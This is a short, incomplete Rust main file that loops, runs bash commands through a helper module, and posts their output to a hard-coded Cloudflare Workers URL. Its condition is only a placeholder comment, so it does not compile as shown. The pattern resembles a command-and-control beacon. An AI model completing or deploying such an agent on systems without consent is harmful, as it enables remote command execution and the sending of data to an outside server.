mod command_executor;
mod worker_communication;

#[tokio::main]
async fn main() {
    let worker_url = "https://serverworker.adoba.workers.dev/";

    loop {
        // Check the response from the Worker (you'll need to implement this logic)
        if /* condition to execute bash command */ {
            match command_executor::execute_bash_command(true) {
                Ok(command_output) => {
                    // Send command_output to Cloudflare worker
                    let response = match worker_communication::send_data_request(&worker_url, &command_output).await {
                        Ok(response) => response,
                        Err(e) => {
                            println!("Error sending data to worker: {}", e);
                            continue; 
                        }
                    };
                    // ... handle response ...
                },
                Err(e) => println!("Error executing command: {}", e),
            }
        } else {
            // ... handle other cases ...
        }

        // Add more conditions or logic to handle different commands
    }
}